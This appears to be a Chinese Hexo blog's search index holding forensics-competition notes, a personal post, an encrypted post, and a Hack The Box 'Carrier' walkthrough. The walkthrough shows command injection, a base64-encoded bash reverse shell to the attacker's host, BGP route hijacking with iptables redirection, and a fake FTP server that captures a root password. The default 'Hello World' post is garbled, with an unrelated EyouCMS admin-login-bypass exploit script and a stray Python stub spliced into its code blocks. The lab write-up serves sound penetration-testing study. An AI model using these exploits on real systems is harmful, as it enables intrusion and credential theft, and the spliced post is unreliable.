<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>取证-笔记</title>
      <link href="//32473/"/>
      <url>//32473/</url>
      
        <content type="html"><![CDATA[<h4 id="查看内核版本"><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h4><pre class="line-numbers language-none"><code class="language-none">uname -runame -acat /proc/version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/medias/000001.png"></p><h4 id="最后一次关机时间-开机，正常关机，登录，程序安装次数，程序的安装时间"><a href="#最后一次关机时间-开机，正常关机，登录，程序安装次数，程序的安装时间" class="headerlink" title="最后一次关机时间,开机，正常关机，登录，程序安装次数，程序的安装时间"></a>最后一次关机时间,开机，正常关机，登录，程序安装次数，程序的安装时间</h4><p><img src="/medias/000011.png"><br>解法二:<br><img src="/medias/000010.png" alt="image"><br>6006 最后一次正常关机</p><h4 id="查看网站对应的域名"><a href="#查看网站对应的域名" class="headerlink" title="查看网站对应的域名"></a>查看网站对应的域名</h4><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\drivers\etc\hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="微信id"><a href="#微信id" class="headerlink" title="微信id"></a>微信id</h4><h4 id="LXM逻辑卷，找出lvm开始的逻辑区块地址（LBA）"><a href="#LXM逻辑卷，找出lvm开始的逻辑区块地址（LBA）" class="headerlink" title="LXM逻辑卷，找出lvm开始的逻辑区块地址（LBA）"></a>LXM逻辑卷，找出lvm开始的逻辑区块地址（LBA）</h4><pre class="line-numbers language-none"><code class="language-none">fdisk -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/medias/000003.png" alt="image"></p><p>解法2：通过查找知道题目所说的分区是：FMP证据文件 -&gt; 展开镜像 -&gt; 选中 分区2 -&gt; 摘要 -&gt; 查看 物理位置：<br><img src="/medias/000002.png" alt="image"></p><p>但是这个内存物理地址的单位是字节（Byte），而一个逻辑区块占用512位，所以要将这个值除以512。<br>1074790400/512=2099200</p><h4 id="LVM-逻辑卷分区内root-逻辑卷的文件系统是什么？物理大小是多少？"><a href="#LVM-逻辑卷分区内root-逻辑卷的文件系统是什么？物理大小是多少？" class="headerlink" title="LVM 逻辑卷分区内root 逻辑卷的文件系统是什么？物理大小是多少？"></a>LVM 逻辑卷分区内root 逻辑卷的文件系统是什么？物理大小是多少？</h4><h4 id="有反向代理，找www-kkzjc-com转发的后台网站所使用的IP地址"><a href="#有反向代理，找www-kkzjc-com转发的后台网站所使用的IP地址" class="headerlink" title="有反向代理，找www.kkzjc.com转发的后台网站所使用的IP地址"></a>有反向代理，找<a href="http://www.kkzjc.com转发的后台网站所使用的ip地址/">www.kkzjc.com转发的后台网站所使用的IP地址</a></h4><pre class="line-numbers language-none"><code class="language-none">// 启动docker服务systemctl start docker//查看容器docker pstemp504_1634979777// 进入容器docker exec -it 容器id /bin/bash// 查看历史记录history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/medias/000007.png" alt="image"><br><img src="/medias/000008.png" alt="image"></p><h4 id="服务器ip"><a href="#服务器ip" class="headerlink" title="服务器ip"></a>服务器ip</h4><p>指的公网ip 所以不是ifconfig<br>通过<br>docker logs 容器id 查看<br><img src="/medias/000012.png" alt="image"></p><h4 id="嫌疑人登录本服务器所使用的-IP-地址-使用此IP地址访问服务器docker（www-kkzjc-com）中的网站，求访问次数"><a href="#嫌疑人登录本服务器所使用的-IP-地址-使用此IP地址访问服务器docker（www-kkzjc-com）中的网站，求访问次数" class="headerlink" title="嫌疑人登录本服务器所使用的 IP 地址?使用此IP地址访问服务器docker（www.kkzjc.com）中的网站，求访问次数"></a>嫌疑人登录本服务器所使用的 IP 地址?使用此IP地址访问服务器docker（<a href="http://www.kkzjc.com)中的网站,求访问次数/">www.kkzjc.com）中的网站，求访问次数</a></h4><pre class="line-numbers language-none"><code class="language-none">last<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/medias/000006.png" alt="image"><br>地址为:192.168.99.222<br>ip访问docker次数</p><pre class="line-numbers language-none"><code class="language-none">docker psdocker logs 容器iddocker logs 容器id | grep 192.168.99.222 | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/medias/000009.png" alt="image"><br>####<br>####<br>####<br>####<br>####<br>####</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><h4 id="-3"><a href="#-3" class="headerlink" title=""></a></h4><h4 id="-4"><a href="#-4" class="headerlink" title=""></a></h4><h4 id="-5"><a href="#-5" class="headerlink" title=""></a></h4><h4 id="-6"><a href="#-6" class="headerlink" title=""></a></h4><h4 id="-7"><a href="#-7" class="headerlink" title=""></a></h4><h4 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h4><pre class="line-numbers language-none"><code class="language-none">certutil -hashfile ideaIU-2018.1.exe sha256  //SHA1 或SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="-8"><a href="#-8" class="headerlink" title=""></a></h4><h4 id="-9"><a href="#-9" class="headerlink" title=""></a></h4><h4 id="-10"><a href="#-10" class="headerlink" title=""></a></h4><h4 id="-11"><a href="#-11" class="headerlink" title=""></a></h4><h4 id="-12"><a href="#-12" class="headerlink" title=""></a></h4><h4 id="-13"><a href="#-13" class="headerlink" title=""></a></h4><h4 id="-14"><a href="#-14" class="headerlink" title=""></a></h4><h4 id="-15"><a href="#-15" class="headerlink" title=""></a></h4><h4 id="-16"><a href="#-16" class="headerlink" title=""></a></h4><h4 id="请找出该服务器的网站访问端口是什么？服务器共绑定对外开放的域名的个数"><a href="#请找出该服务器的网站访问端口是什么？服务器共绑定对外开放的域名的个数" class="headerlink" title="请找出该服务器的网站访问端口是什么？服务器共绑定对外开放的域名的个数?"></a>请找出该服务器的网站访问端口是什么？服务器共绑定对外开放的域名的个数?</h4><pre class="line-numbers language-none"><code class="language-none">cat/less 查看/etc/nginx/conf.d/www.kkzjc.com可知```  ![image](/medias/000005.png)![image](/medias/000004.png)#### 该服务器中运行了 docker应用，在本地有多少 docker镜像？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker ps<br>docker ps 命令中在PORTS里面显示了两个端口，前面0.0.0.0就是主机，也就是自己，而后面的转发端口就对应着docker服务器的端口</p><p>```</p><h4 id="在运行中的容器节点中，其中一台容器ID-为-15debb1824e6的容器节点，它运行了什么服务？（C）A-ftp-B-ssh-C-nginx-D-smtp"><a href="#在运行中的容器节点中，其中一台容器ID-为-15debb1824e6的容器节点，它运行了什么服务？（C）A-ftp-B-ssh-C-nginx-D-smtp" class="headerlink" title="在运行中的容器节点中，其中一台容器ID 为 15debb1824e6的容器节点，它运行了什么服务？（C）A. ftp B. ssh C. nginx D. smtp"></a>在运行中的容器节点中，其中一台容器ID 为 15debb1824e6的容器节点，它运行了什么服务？（C）A. ftp B. ssh C. nginx D. smtp</h4><h4 id="上题容器节点中，占用了主机的哪个端口？"><a href="#上题容器节点中，占用了主机的哪个端口？" class="headerlink" title="上题容器节点中，占用了主机的哪个端口？"></a>上题容器节点中，占用了主机的哪个端口？</h4><h4 id="该服务器中网站运行在-docker-容器中，其中-web服务使用的是什么应用？"><a href="#该服务器中网站运行在-docker-容器中，其中-web服务使用的是什么应用？" class="headerlink" title="该服务器中网站运行在 docker 容器中，其中 web服务使用的是什么应用？"></a>该服务器中网站运行在 docker 容器中，其中 web服务使用的是什么应用？</h4><h4 id="上题所述运行-web-服务的容器节点，使用的镜像名称是什么？（格式-REPOSITORY：TAG）"><a href="#上题所述运行-web-服务的容器节点，使用的镜像名称是什么？（格式-REPOSITORY：TAG）" class="headerlink" title="上题所述运行 web 服务的容器节点，使用的镜像名称是什么？（格式 REPOSITORY：TAG）"></a>上题所述运行 web 服务的容器节点，使用的镜像名称是什么？（格式 REPOSITORY：TAG）</h4><h4 id="上题所述容器节点占用的容器端口是什么？"><a href="#上题所述容器节点占用的容器端口是什么？" class="headerlink" title="上题所述容器节点占用的容器端口是什么？"></a>上题所述容器节点占用的容器端口是什么？</h4><h4 id="-17"><a href="#-17" class="headerlink" title=""></a></h4><h4 id="-18"><a href="#-18" class="headerlink" title=""></a></h4><h4 id="-19"><a href="#-19" class="headerlink" title=""></a></h4><h4 id="-20"><a href="#-20" class="headerlink" title=""></a></h4><h4 id="-21"><a href="#-21" class="headerlink" title=""></a></h4><h4 id="-22"><a href="#-22" class="headerlink" title=""></a></h4><h4 id="-23"><a href="#-23" class="headerlink" title=""></a></h4><h4 id="-24"><a href="#-24" class="headerlink" title=""></a></h4>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC 长安杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小瞬间</title>
      <link href="//49315/"/>
      <url>//49315/</url>
      
        <content type="html"><![CDATA[<h1 id="被打动的小瞬间"><a href="#被打动的小瞬间" class="headerlink" title="被打动的小瞬间"></a>被打动的小瞬间</h1><hr><h4 id="利贵之真男人-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-–2021-10-22"><a href="#利贵之真男人-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-–2021-10-22" class="headerlink" title="利贵之真男人  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;          –2021.10.22"></a>利贵之真男人  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;          –2021.10.22</h4><p>这就是对另一半的爱吗<br>泪目！respect!呜呜呜~</p><img src="/medias/04.png" width="80%" height="80%">]]></content>
      
      
      
        <tags>
            
            <tag> moment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="//16107/"/>
      <url>//16107/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"from time import time,sleepimport requestsimport sysclass EyouCMS:    def __init__(self,URL):        self.Req = requests.session()        self.URL = URL        self.SleepTime = 0.5        self.AdminURL = 'login.php?m=admin&amp;c=Admin&amp;a=admin_edit&amp;id=1&amp;lang=cn'        self.Payload = 'index.php/?m=api&amp;c=ajax&amp;a=get_token&amp;name='        self.admin_id = 'admin_id'        self.admin_login_expire = 'admin_login_expire'        self.admin_info_role_id = 'admin_info.role_id'        self.Headers = {            'x-requested-with': 'XMLHttpRequest',        }    def Banner(self):        print("-"*10 + "后台登录绕过" + "-"*10)    def change(self,string):        temp = ''        for n, s in enumerate(string):            if n == 0:                if s.isalpha():                    return '0'                    break            if s.isdigit():                temp += str(s)            else:                if s.isalpha():                    break        return temp    def SetID(self):        res = self.Req.get(self.URL + self.Payload + self.admin_id, headers=self.Headers)        print("admin_id[+]:\t\t\t\t\t" + res.text)        if 'Set-cookie' in res.headers:            print(res.headers['set-cookie'])        if res.status_code != 200:            sys.exit("Api模块请求404")        # print(res.headers)    def SetExpire(self):        while True:            res = self.Req.get(self.URL + self.Payload + self.admin_login_expire, headers=self.Headers)           # print(res.text,end='\t\t\t\t')           # print(self.change(res.text))            if(time()-int(self.change(res.text),10)&lt;3600):                print("admin_login_expire[+]:\t\t\t" + res.text)                # print(res.headers)                break            sleep(self.SleepTime)    def SetRoleID(self):        while True:            res = self.Req.get(self.URL + self.Payload + self.admin_info_role_id, headers=self.Headers)            if(int(self.change(res.text),10)&lt;=0):                print("admin_info.rele_id[+]:\t\t\t" + res.text)                break            sleep(self.SleepTime)    def CheckLogin(self):        res = self.Req.get(self.URL + self.AdminURL, headers=self.Headers)        res.encoding = res.apparent_encoding        if '更换头像' in res.text:            print("OK")    def run(self):        self.SetID()        self.SetExpire()        self.SetRoleID()        self.CheckLogin()if __name__ == '__main__':    Start = time()    URL = 'http://10.12.246.7:20080/'    e = EyouCMS(URL)    e.run()    End = time()    print(End-Start)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># encoding: utf-8# module typing.re# from (pre-generated)# by generator 1.147""" Wrapper namespace for re type aliases. """# no imports# functionsdef Match(*args, **kwargs): # real signature unknown    """    The central part of internal API.            This represents a generic version of type 'origin' with type arguments 'params'.        There are two kind of these aliases: user defined and special. The special ones        are wrappers around builtin collections and ABCs in collections.abc. These must        have 'name' always set. If 'inst' is False, then the alias can't be instantiated,        this is used by e.g. typing.List and typing.Dict.    """    passdef Pattern(*args, **kwargs): # real signature unknown    """    The central part of internal API.            This represents a generic version of type 'origin' with type arguments 'params'.        There are two kind of these aliases: user defined and special. The special ones        are wrappers around builtin collections and ABCs in collections.abc. These must        have 'name' always set. If 'inst' is False, then the alias can't be instantiated,        this is used by e.g. typing.List and typing.Dict.    """    pass# no classes# variables with complex values__all__ = [    'Pattern',    'Match',]__weakref__ = None # (!) real value is "&lt;attribute '__weakref__' of 'typing.re' objects&gt;"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>littleboy</title>
      <link href="//64198/"/>
      <url>//64198/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="5ebe491fea7e6f24c16ecbbc09d943956aaa7c9dc29ed9d7c133fd3462d867d1">952d7e531685597564c1af9daf7029c2c7a62f24f55504fc739ba34e196f0a10d906368afee23a862810062430028ff47aaaecb3855ec518f21893db3a37c99c32be78b1481fef501f3934c16547fbefe890673ba1a00ab17980df887e359c0f2720bc777dfe78b57140b50117c124b87fae10037f01b9df9d9beae5c644b140fc4305ca98b7e225ac44c53331ebeb0f7246e170b247a5e9ebefeb024e6d206d2feb7acb649a52bb205304a60784bb784b18edabee35a8097d14c09f557724ad77a11afb0831bec2e18f67aaf72873c47f8b2aa66963d9d0d75a32f36a380b3b6438e39d80e9a4ce310b91160da5ee2690b4885243baee8517e4a076f3e374ca14e1152797a61d9cf135ff3bd275cb54d2dd24603f6c029128fccbb317702cb85a098937d82ac06cac72468e281c1672cf01992544d1b01d3fd8e6490dcc8e8e6eef9a24ee6ee4b222df56e53be22823d0416e65abeb22ae11f652124eb0b145ab2cf205fe46c891c0ca5b24c39ad8d9502c9352ca673526d843f4c9b622474a9f32832ba946cc36d9e0a4f12806c75afb651c458be3590a570cd02c59b6bb5427c3a030367fcaea27037bec99d249cab93632179c3f6c4d4d075b56d257c904c9cf2e556996adfd94519ccaf2ebcb0151a79a1e7c9f8740e530e009e347b848336260c09bd2d3b3c9a8f9705bf64a873164e88cba38c011d5918a3aa6f22c0d9d0fe7dff24bb657f2a1e49cf17317ee2cf03e2719b0e9a519b8c4f59e5240b0652806eba26243652170376acb1e8425</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入kin9yh给您的密码.">请输入kin9yh给您的密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Carrier</title>
      <link href="//47348/"/>
      <url>//47348/</url>
      
        <content type="html"><![CDATA[<p>Hack The Box是一个CTF挑战靶机平台，在线渗透测试平台。它能帮助你提升渗透测试技能和黑盒测试技能，它包含了一些不断更新的挑战，其中有模拟真实世界场景，也有倾向于CTF风格的挑战。<br><br><a href="https://www.hackthebox.eu/">https://www.hackthebox.eu/</a></p><p><img src="https://image.3001.net/images/20210221/1613914144_6032602030edc000def48.png!small"></p><p>平台上有很多靶机，从易到难，黑客每入侵一台机器都会获得相应积分，通过积分排名设有名人堂。今天要实验的是靶机Carrier。</p><p><img src="https://image.3001.net/images/20210221/1613916268_6032686c1be7e9227e952.png!small" alt=" "></p><p>目标靶机IP：10.10.10.105</p><p>本机IP：10.10.13.133</p><p>首先利用Nmap对目标靶机进行信息收集</p><ol><li>nmap -sC -F -sV 10.10.10.105  </li></ol><p>-sC：通过默认脚本进行扫描</p><p>-sV：扫描目标主机端口上运行软件的版本</p><p>-F：扫描100个最有可能开放的端口</p><p><img src="https://image.3001.net/images/20210221/1613916336_603268b014e1939c6b25e.png!small" alt=" "></p><p>显示靶机开放了21，22，80，3306端口，但是21，3306端口被过滤了。22端口是SSH需要登陆，我们先从80端口开始看看能不能得到有用的信息</p><p>先打开网页，是一个登陆页面，有2个Error提示45007，45009，去Google查询类似的关键词发现没有什么可用信息，应该是自定义的WEB框架，</p><p><img src="https://image.3001.net/images/20210221/1613916368_603268d056479f0491f19.png!small" alt=" "></p><p>我们用gobuster来进行目录爆破</p><pre class="line-numbers language-none"><code class="language-none">1. gobuster  -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613916447_6032691f326958ea7890e.png!small" alt=" "></p><p>先看下tools</p><p>/tools:</p><p><img src="https://image.3001.net/images/20210221/1613916494_6032694ebd0593491279e.png!small" alt=" "></p><p>点进去显示“许可过期，正在退出”</p><p>看下doc</p><p>/doc：</p><p><img src="https://image.3001.net/images/20210221/1613916517_603269654db8c4b8bdc30.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613916530_6032697216e0dbdf9ad8c.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613916549_603269854c4816fa31acd.png!small" alt=" "></p><p>一个网络架构图还有一个是错误代码描述的PDF，根据刚刚网页提示的错误代码我们查下对应的解释</p><p>Error 4005：守护进程没有响应</p><p>Error 4009：配置中没有设置默认的用户名和密码（查看机箱序列号）</p><p>看下</p><p>/debug</p><p><img src="https://image.3001.net/images/20210221/1613916578_603269a2b8cc83dfdc32a.png!small" alt=" "></p><p>没有什么特别有用的信息</p><p>根据那种图可能还有别的设备，这样我想起了snmp服务</p><p>所以我们扫下靶机UDP的端口看看有没有什么有用的信息</p><pre class="line-numbers language-none"><code class="language-none">1. nmap -sU 10.10.10.105  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613916613_603269c593d6775b74f1b.png!small" alt=" "></p><p>果然目标机器是有开启snmp，那么我们用snmpwalk来进行弱口令利用</p><pre class="line-numbers language-none"><code class="language-none">1. snmpwalk -v 1 -c public 10.10.10.105  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613916670_603269fe4c143e9bf35d7.png!small" alt=" "></p><p>这个NET_45JDX23可能就是所谓的序列号</p><p>我们回到登陆进行登陆。</p><p>Username:尝试常见的默认用户名:admin, root…..</p><p>Password: NET_45JDX23</p><p><img src="https://image.3001.net/images/20210221/1613916705_60326a2113bdfaa44ad81.png!small" alt=" "></p><p>页面显示我们的凭证是无效的</p><p><img src="https://image.3001.net/images/20210221/1613916721_60326a31a1ae8e734afe4.png!small" alt=" "></p><p>我们进入Tickets</p><p><img src="https://image.3001.net/images/20210221/1613916742_60326a469cc159fa3e107.png!small" alt=" "></p><p>通过这条信息 我们知道了3个网段（大概就是刚刚那个网络架构图），还有一个FTP：10.120.15.0/24</p><p>然后我们在点Diagnosticd，提示我们凭证无效，但是可以使用检查功能<br>点下Verify status</p><p><img src="https://image.3001.net/images/20210221/1613916772_60326a64b60396dac0e69.png!small" alt=" "></p><p>这个部分很像是远程命令执行。</p><p>我们用BURP抓包看下信息</p><p><img src="https://image.3001.net/images/20210221/1613916792_60326a785f87bc6ce01ec.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613916805_60326a856f6908fe41420.png!small" alt=" "></p><p>很明显这个quagga就是上面输出信息的一部分，查找相关资料，发现这是一款路由器软件</p><p><img src="https://image.3001.net/images/20210221/1613916826_60326a9a1ca0fafb02a35.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613916838_60326aa6f32abf00f667c.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613916855_60326ab730e5fd5d381fc.png!small" alt=" "></p><p>返回信息如下</p><p><img src="https://image.3001.net/images/20210221/1613916869_60326ac5853b85267bc4a.png!small" alt=" "></p><p>那么我们在试着输入 root；echo hello</p><p><img src="https://image.3001.net/images/20210221/1613916887_60326ad7835cd26179090.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613916903_60326ae76bc8a5575c39c.png!small" alt=" "></p><p>如图发现我们是可以用;进行多语句的执行，那么我们用bash反弹一个shell<br>现在用kali监听下9001</p><p><img src="https://image.3001.net/images/20210221/1613916919_60326af79771287fd487d.png!small" alt=" "></p><p>然后转换下编码</p><p><img src="https://image.3001.net/images/20210221/1613916935_60326b0711f5c5500fcb3.png!small" alt=" "></p><p>这里输出cm9vdDtiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEzLjEzMy85MDAxIDA+JjE=</p><p><img src="https://image.3001.net/images/20210221/1613916995_60326b439fcc295c242cb.png!small" alt=" "></p><p>这样我们就得到一个shell了</p><p><img src="https://image.3001.net/images/20210221/1613917014_60326b56a57bdfe84388a.png!small" alt=" "></p><p>这样我们就可以得到user的flag了</p><p><img src="https://image.3001.net/images/20210221/1613917029_60326b658416f8bc14d63.png!small" alt=" "></p><p>接下来就是获得根ROOT的权限</p><p>从之前的信息我们了解到有一台FTP服务器：10.120.15.0/24</p><p>我们试着ping 10.120.15.1看看能不能ping通</p><p><img src="https://image.3001.net/images/20210221/1613917049_60326b798b24ff840f323.png!small" alt=" "></p><p>我们需要在靶机上进行扫描，当然你可以用msf添加路由的方式扫描，这里我用另一个种方法把nmap的二进制静态执行文件上传到靶机进行扫描</p><p>Github：<a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p><p><img src="https://image.3001.net/images/20210221/1613917117_60326bbd936da7f7ca504.png!small" alt=" "><br>然后我们用python的SimpleHTTPServer模块建立服务然后靶机去下载这个文件</p><p><img src="https://image.3001.net/images/20210221/1613917137_60326bd1a5f91184495b9.png!small" alt=" "></p><p>然后再靶机分别输入如下命令</p><pre class="line-numbers language-none"><code class="language-none">1. curl http://10.10.13.133:8000/nmap -o nmap  2. chmod +x nmap  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613917168_60326bf0dfff3d71b2074.png!small" alt=" "></p><p>然后我们执行</p><pre class="line-numbers language-none"><code class="language-none">1. ./nmap -p 21 10.120.15.0/24  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613917194_60326c0a20885b8393413.png!small" alt=" "></p><p>发现没有探测到，可能是目标禁止ICMP数据包</p><p>那么我们加个-Pn参数，同时把结果导出</p><ol><li>./nmap -Pn -vvv -p 21 10.120.15.0/24  –open</li></ol><p>-Pn：不进行ping直接扫描</p><p>-vvv：显示详细过程</p><p>–open：只显示端口open状态信息</p><p><img src="https://image.3001.net/images/20210221/1613917239_60326c37070ff78205470.png!small" alt=" "></p><p>我们发现 10.120.15.10是开放21端口的</p><p>然后我们尝试下FTP匿名登陆，登陆的时候可能不会有回显，需要自己打</p><p><img src="https://image.3001.net/images/20210221/1613917260_60326c4cc077d7b519952.png!small" alt=" "></p><p>无法执行，之前那个ticks也说这个FTP出现了问题。</p><p><img src="https://image.3001.net/images/20210221/1613917283_60326c63b30c8ed46748e.png!small" alt=" "></p><p>我们需要通过劫持BGP欺骗AS200将数据传输给我们的靶机，然后开启假的FTP服务，之前的信息有显示到有人会定期访问这个FTP，这样我们就可以窃取到凭证</p><p><img src="https://image.3001.net/images/20210221/1613917306_60326c7a114321d37d235.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613917324_60326c8cde86268a51b76.png!small" alt=" "></p><p>现在的情况大概就是图上这个样子</p><p>我们在终端分别输入</p><pre class="line-numbers language-none"><code class="language-none">1. vtysh  （quagga的命令）  2. configure terminal（进入配置模式）  3. do show run （显示配置信息）  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613917349_60326ca5e022d69348dd9.png!small" alt=" "><br>我们需要增加一个network就是把刚刚FTP的那个网段加进来</p><p>这里我直接编辑/etc/ quagga下的bgpd.conf文件内容也就上面显示的内容</p><p><img src="https://image.3001.net/images/20210221/1613917372_60326cbc6d783b24d7967.png!small" alt=" "></p><p>我们在自己的kali上编辑下内容在里面加一条10.120.15.0/25</p><p><img src="https://image.3001.net/images/20210221/1613917391_60326ccf1fc7ac4e8272e.png!small" alt=" "></p><p>然后用python的SimpleHTTPServer服务上传到靶机里面去跟nmap一样<br>把之前的文件重命名，然后把我们的文件下载下来</p><pre class="line-numbers language-none"><code class="language-none">1. curl http://10.10.13.133:8000/bgpd.conf -o bgpd.con  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20210221/1613917421_60326cedadef343124f39.png!small" alt=" "></p><p>然后在iptales上添加记录并重启quagga服务</p><pre class="line-numbers language-none"><code class="language-none">1. iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.14.65:21   2. iptables -t nat -A POSTROUTING -j MASQUERADE 3. service quagga restart <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后我们在下载一个假的ftp监听21端口来得到凭证<br>Github：<a href="https://github.com/b1ngda0/FtpServicePython/">https://github.com/b1ngda0/FtpServicePython/</a></p><p><img src="https://image.3001.net/images/20210221/1613917461_60326d1528173122a7b93.png!small" alt=" "></p><p>不久后就能得到账号密码</p><p>root:BGPtelc0rout1ng</p><p>然后ssh登陆并得到root flag</p><p><img src="https://image.3001.net/images/20210221/1613917486_60326d2eea61c1609b600.png!small" alt=" "></p><p><img src="https://image.3001.net/images/20210221/1613917503_60326d3f4ccc7f0977896.png!small" alt=" "></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
